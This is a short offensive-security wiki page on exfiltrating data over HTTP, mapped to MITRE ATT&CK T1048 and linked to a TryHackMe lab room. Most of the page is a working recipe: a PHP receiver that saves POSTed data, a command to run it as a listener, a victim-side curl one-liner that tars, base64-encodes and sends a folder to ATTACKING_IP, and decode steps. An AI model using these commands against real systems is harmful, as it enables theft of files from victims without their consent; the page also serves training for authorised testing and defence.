---
description: MITRE ATT&CK™  - Exfiltration Over Alternative Protocol - Technique T1048
---

# Over HTTP(s)

## Theory

Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux curl may be used to invoke protocols such as HTTP/S

{% hint style="danger" %}
We can also use [HTTP(S) Tunneling](../pivoting/http-tunneling.md) as a good [exfiltration](./) channel.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Curl" %}
We will host a simple PHP server in order to retrieve encoded POST data.

First write the following code in your `index.php` file

```php
<?php
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
}
?>
```

Second, start the PHP web-server in the same directory

```bash
# Start server on port 80
v4resk㉿kali$ php -S 0.0.0.0:80
```

On the victim computer, you can now send data through POST request. It will be saved at `/tmp/http.bs64`

```bash
# Linux
# Compress folder, base64, and send
user@victime$ curl --data "file=$(tar zcf - folderToExfiltrate | base64)" http://ATTACKING_IP/
```

On attacking machine, we can decode now decode it:

```bash
# Decode compressed folders
v4resk㉿kali$ sed -i 's/ /+/g' /tmp/http.bs64
v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/dataxexfilt" %}
